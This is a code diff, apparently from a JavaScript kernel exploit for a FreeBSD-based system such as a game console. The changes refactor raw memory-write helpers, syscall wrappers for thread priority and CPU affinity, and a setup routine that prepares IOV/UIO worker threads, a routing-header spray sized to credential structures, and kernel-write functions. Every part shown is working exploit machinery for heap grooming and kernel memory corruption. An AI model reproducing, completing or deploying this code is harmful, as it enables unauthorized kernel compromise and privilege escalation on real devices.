@@ -100,10 +100,14 @@ Buffer.prototype.write32 = function(offset, value) {
 };
 */
 
-
 Buffer.prototype.write8 = function(offset, value) {
-    this.addr.write8(offset, value & 0xFF);
+    mem.write8(this.addr.add(offset), value & 0xFF);
 };
+
+
+/*Buffer.prototype.write8 = function(offset, value) {
+    this.addr.write8(offset, value & 0xFF);
+};*/
 Buffer.prototype.write16 = function(offset, value) {
     this.addr.write16(offset, value & 0xFFFF);
 };
@@ -143,9 +147,10 @@ Buffer.prototype.address = function() {
 Buffer.prototype.fill = function(byte) {
     const fillByte = byte & 0xFF;
     for (let i = 0; i < this.size; i++) {
-        this.write8(i, fillByte);
+        mem.write8(this.addr.add(i), fillByte);
     }
 };
+
 
 
 /*Buffer.prototype.write8 = function(offset, value) {
@@ -358,22 +363,20 @@ function close(fd) {
 }
 
 function setRealtimePriority(prio) {
+   
     const truncated = prio & 0xFF;
-
     const _rtprio = new Buffer(4);
-    _rtprio.write16(0, RTP_PRIO_REALTIME); 
-    _rtprio.write16(2, truncated);         
+    
+    _rtprio.write16(0, 2);  // type
+    _rtprio.write16(2, truncated);          // prio
 
     try {
-        sysi("rtprio_thread", RTP_SET, 0, _rtprio.addr);
+        sysi("rtprio_thread", 1, 0, _rtprio.addr);
         return true;
     } catch (e) {
         log("setRealtimePriority failed:", e);
         return false;
     }
-}
- function read(fd) {
- return  sysi("read", fd);
 }
  
  
@@ -476,17 +479,6 @@ function cpusetSetAffinity(mask) {
 	sysi("cpuset_setaffinity", 3, 1, -1, 0x10, mask.addr);
 }
 
-/*function cpuset_setaffinity(level, which, id, setsize, mask) {
-    return sysi(
-        "cpuset_setaffinity",
-        level,
-        which,
-        id,
-        setsize,
-        mask ? mask.addr : 0
-    );
-}
-*/
 function set_cpu_affinity(mask) {
   sysi("cpuset_setaffinity", 3, 1, -1, 0x10, mask.addr);
 }
@@ -792,8 +784,7 @@ function kwriteSlow(addr, buffer) {
 
 
 function performSetup() {
-    try {
-      
+   try {
         log("Initializing worker states");
         iovState = new WorkerState(IOV_THREAD_NUM);
         uioState = new WorkerState(UIO_THREAD_NUM);
@@ -802,7 +793,7 @@ function performSetup() {
         sprayRthdrLen = buildRthdr(sprayRthdr, UCRED_SIZE);
         
         log("Preparing msg buffer");
-        msg.putLong(0x10, msgIov.address());  // usa .address()
+        msg.putLong(0x10, msgIov.address());
         msg.putLong(0x18, MSG_IOV_NUM);
 
         log("Filling dummy buffer with 0x41");
@@ -810,11 +801,12 @@ function performSetup() {
         
         log("dummyBuffer first bytes:", 
             dummyBuffer.read8(0).toString(16),
-            dummyBuffer.read8(1).toString(16));
+            dummyBuffer.read8(1).toString(16),
+            dummyBuffer.read8(2).toString(16));
         
         log("Setting up UIO IOV buffers");
-        uioIovRead.putLong(0, dummyBuffer.address());  // usa .address()
-        uioIovWrite.putLong(0, dummyBuffer.address()); // usa .address()
+        uioIovRead.putLong(0, dummyBuffer.address());
+        uioIovWrite.putLong(0, dummyBuffer.address());
         
         log("Getting current CPU core");
         try {
@@ -826,11 +818,10 @@ function performSetup() {
         }
         
         log("Setting CPU affinity to core 4");
-        const core4Mask = new Buffer(0x10);
-        core4Mask.write32(0, 1 << 4);
-        
         try {
-            cpusetSetAffinity(core4Mask);  // questa usa .addr internamente
+            const core4Mask = new Buffer(0x10);
+            mem.write32(core4Mask.addr, 1 << 4);
+            cpusetSetAffinity(core4Mask);
             log("CPU affinity set successfully");
         } catch (e) {
             log("Warning: Failed to set CPU affinity:", e);
@@ -840,6 +831,8 @@ function performSetup() {
         try {
             if (!setRealtimePriority(256)) {
                 log("Warning: Failed to set realtime priority");
+            } else {
+                log("Realtime priority set successfully");
             }
         } catch (e) {
             log("Warning: Exception in setRealtimePriority:", e);
@@ -1555,6 +1548,7 @@ class WorkerState {
 }
 
 main();
+
 
 
 
